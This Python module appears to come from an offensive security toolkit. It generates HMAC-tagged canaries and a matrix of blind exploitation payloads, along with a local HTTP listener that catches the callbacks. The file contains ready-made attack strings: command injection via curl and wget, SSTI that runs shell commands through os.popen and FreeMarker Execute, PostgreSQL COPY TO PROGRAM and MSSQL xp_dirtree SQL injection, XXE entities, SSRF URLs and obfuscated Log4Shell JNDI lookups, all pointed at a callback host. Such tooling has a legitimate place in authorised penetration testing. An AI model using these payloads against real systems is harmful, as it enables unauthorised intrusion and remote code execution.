"""
Out-of-Band (OOB) Cryptographic Canary Generator & Callback Correlator (`viperclaw.analyzers.oob_engine`).

Generates HMAC-authenticated blind exploitation payloads across 6 vulnerability classes
(Blind SSRF, Blind XXE, Blind OS Command Injection, Blind SSTI, Blind SQLi OOB, Log4Shell/JNDI)
and includes an ephemeral stdlib HTTP callback listener (`http.server`) to deterministically
catch and verify out-of-band interactions during local, VPN, or port-forwarded engagements.
"""

from __future__ import annotations

import hashlib
import hmac
import http.server
import socketserver
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List


@dataclass
class OOBHit:
    canary_id: str
    vuln_class: str
    parameter: str
    method: str
    path: str
    client_ip: str
    headers: Dict[str, str]
    body: str
    timestamp: float

    def to_dict(self) -> Dict[str, Any]:
        return {
            "canary_id": self.canary_id,
            "vuln_class": self.vuln_class,
            "parameter": self.parameter,
            "method": self.method,
            "path": self.path,
            "client_ip": self.client_ip,
            "headers": self.headers,
            "body": self.body,
            "timestamp": self.timestamp,
        }


class OOBEngine:
    """Cryptographic OOB canary generator, payload synthesizer, and ephemeral HTTP callback catcher."""

    DEFAULT_SECRET = b"viperclaw-oob-canary-key"

    @classmethod
    def generate_canary(
        cls,
        parameter: str,
        vuln_class: str = "ssrf",
        secret: bytes = DEFAULT_SECRET,
    ) -> str:
        clean_param = "".join(c for c in parameter.lower() if c.isalnum())[:12] or "param"
        clean_vuln = "".join(c for c in vuln_class.lower() if c.isalnum())[:8] or "oob"
        msg = f"{clean_vuln}:{clean_param}".encode("utf-8")
        tag = hmac.new(secret, msg, hashlib.sha256).hexdigest()[:10]
        return f"vc-{clean_vuln}-{clean_param}-{tag}"

    @classmethod
    def verify_canary(
        cls,
        canary: str,
        secret: bytes = DEFAULT_SECRET,
    ) -> tuple[bool, str, str]:
        parts = canary.strip("/").split("-")
        if len(parts) != 4 or parts[0] != "vc":
            return False, "", ""
        _, clean_vuln, clean_param, provided_tag = parts
        msg = f"{clean_vuln}:{clean_param}".encode("utf-8")
        expected_tag = hmac.new(secret, msg, hashlib.sha256).hexdigest()[:10]
        if hmac.compare_digest(provided_tag, expected_tag):
            return True, clean_vuln, clean_param
        return False, "", ""

    @classmethod
    def build_payload_matrix(
        cls,
        callback_base_url: str,
        parameter: str = "url",
        secret: bytes = DEFAULT_SECRET,
    ) -> Dict[str, Any]:
        base = callback_base_url.rstrip("/")
        parsed_host = base.split("://")[-1].split("/")[0]
        canaries: Dict[str, str] = {}
        payloads: Dict[str, List[str]] = {}

        for vclass in ("ssrf", "xxe", "cmdi", "ssti", "sqli", "jndi"):
            cid = cls.generate_canary(parameter, vclass, secret=secret)
            canaries[vclass] = cid
            cb_url = f"{base}/{cid}"

            if vclass == "ssrf":
                payloads["blind_ssrf"] = [
                    cb_url,
                    f"http://{parsed_host}/{cid}",
                    f"//127.0.0.1/@{parsed_host}/{cid}",
                ]
            elif vclass == "xxe":
                payloads["blind_xxe"] = [
                    f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{cb_url}"> %xxe;]><root/>',
                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}">]><foo>&xxe;</foo>',
                ]
            elif vclass == "cmdi":
                payloads["blind_cmdi"] = [
                    f";curl -s {cb_url};",
                    f"|wget -qO- {cb_url}|",
                    f"$(curl -s {cb_url})",
                    f"`curl -s {cb_url}`",
                ]
            elif vclass == "ssti":
                payloads["blind_ssti"] = [
                    f"{{{{cycler.__init__.__globals__.os.popen('curl -s {cb_url}').read()}}}}",
                    f"${{\"freemarker.template.utility.Execute\"?new()(\"curl -s {cb_url}\")}}",
                ]
            elif vclass == "sqli":
                payloads["blind_sqli_oob"] = [
                    f"'; COPY (SELECT '') TO PROGRAM 'curl -s {cb_url}';--",
                    f"'; EXEC master..xp_dirtree '\\\\{parsed_host}\\{cid}';--",
                ]
            elif vclass == "jndi":
                payloads["log4shell_jndi"] = [
                    f"${{jndi:ldap://{parsed_host}/{cid}}}",
                    f"${{${{lower:j}}ndi:${{lower:l}}dap://{parsed_host}/{cid}}}",
                ]

        return {
            "callback_base_url": base,
            "parameter": parameter,
            "canaries": canaries,
            "payloads": payloads,
        }

    @classmethod
    def run_ephemeral_listener(
        cls,
        trigger_fn: Callable[[str], None] | None = None,
        host: str = "127.0.0.1",
        port: int = 0,
        wait_seconds: float = 1.5,
        secret: bytes = DEFAULT_SECRET,
    ) -> Dict[str, Any]:
        """
        Start an ephemeral HTTP OOB callback listener on `host:port`, optionally invoke
        `trigger_fn(callback_base_url)`, wait for callbacks, and return verified OOB hits.
        """
        hits: List[OOBHit] = []
        lock = threading.Lock()

        class _Handler(http.server.BaseHTTPRequestHandler):
            def _record(self, method: str) -> None:
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(min(length, 16384)).decode("utf-8", errors="replace") if length > 0 else ""
                path_seg = self.path.lstrip("/").split("?")[0].split("/")[0]
                valid, vclass, param = cls.verify_canary(path_seg, secret=secret)
                if not valid:
                    vclass = "untagged"
                    param = "unknown"
                hit = OOBHit(
                    canary_id=path_seg,
                    vuln_class=vclass,
                    parameter=param,
                    method=method,
                    path=self.path,
                    client_ip=self.client_address[0],
                    headers={k.lower(): v for k, v in self.headers.items()},
                    body=body,
                    timestamp=time.time(),
                )
                with lock:
                    hits.append(hit)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")

            def do_GET(self) -> None:  # noqa: N802
                self._record("GET")

            def do_POST(self) -> None:  # noqa: N802
                self._record("POST")

            def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
                return

        class _ThreadedServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
            allow_reuse_address = True

        server = _ThreadedServer((host, port), _Handler)
        bound_port = server.server_address[1]
        base_url = f"http://{host}:{bound_port}"

        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            if trigger_fn is not None:
                trigger_fn(base_url)
            else:
                time.sleep(max(0.1, min(wait_seconds, 10.0)))
        finally:
            server.shutdown()
            server.server_close()

        return {
            "listener_url": base_url,
            "verified_hits_count": len(hits),
            "hits": [h.to_dict() for h in hits],
        }
